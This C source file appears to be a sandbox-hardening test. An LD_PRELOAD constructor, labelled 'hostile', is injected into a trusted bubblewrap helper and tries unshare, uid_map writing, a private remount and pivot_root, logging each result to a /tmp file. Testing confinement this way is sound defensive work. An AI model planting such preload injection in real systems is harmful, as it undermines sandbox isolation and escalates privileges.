// H0.1S loader-environment injection: constructor runs inside the trusted
// helper process (profile neuestar-bwrap) BEFORE bwrap's own logic, via
// LD_PRELOAD (lowercase pix preserves caller environment influence).
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/syscall.h>

__attribute__((constructor)) static void hostile(void) {
    int u = unshare(CLONE_NEWUSER) == 0 ? 1 : 0;
    int mapped = 0;
    if (u) {
        int fd = open("/proc/self/uid_map", O_WRONLY);
        if (fd >= 0) { mapped = write(fd, "0 1000 1\n", 9) >= 0 ? 1 : 0; close(fd); }
    }
    int m = mount("none", "/", "none", MS_REC | MS_PRIVATE, NULL) == 0 ? 1 : 0;
    int p = syscall(SYS_pivot_root, "/", "/") == 0 ? 1 : 0;
    int fd = open("/tmp/hostile-result.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        dprintf(fd, "hostile_preload: unshare=%d uid_map=%d mount=%d pivot=%d\n", u, mapped, m, p);
        close(fd);
    }
}
